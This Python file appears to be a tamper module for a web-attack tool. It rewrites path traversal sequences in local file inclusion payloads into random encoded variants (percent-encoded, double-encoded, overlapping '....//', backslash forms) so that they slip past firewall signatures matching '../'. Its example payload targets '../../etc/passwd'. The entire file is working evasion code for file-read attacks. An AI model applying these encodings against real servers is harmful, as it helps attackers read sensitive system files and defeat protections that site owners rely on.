import random
import re

__example_payload__ = "../../etc/passwd"
__type__ = "obfuscate path traversal sequences to dodge ../ signature matching"
__category__ = "lfi"
__chain_stage__ = "lexical"
__contexts__ = ("form", "query")

_TRAVERSAL = re.compile(r"\.\./")

# Each variant normalizes back to ../ somewhere in the decode chain
TRAVERSAL_VARIANTS = (
    "%2e%2e%2f",        # fully percent-encoded
    "%252e%252e%252f",  # double-encoded (WAF decodes once, app decodes again)
    "....//",           # overlap: stripping one ../ leaves another
    "..%2f",            # dots raw, slash encoded
    "%2e%2e/",          # dots encoded, slash raw
    "..//",             # duplicated separator
    "%2e%2e%5c",        # backslash flavor (Windows paths)
    "%2E%2E%2F",        # uppercase percent-encoding
)


def tamper(payload, **kwargs):
    if not payload:
        return payload
    variant = random.choice(TRAVERSAL_VARIANTS)
    return _TRAVERSAL.sub(variant, payload)
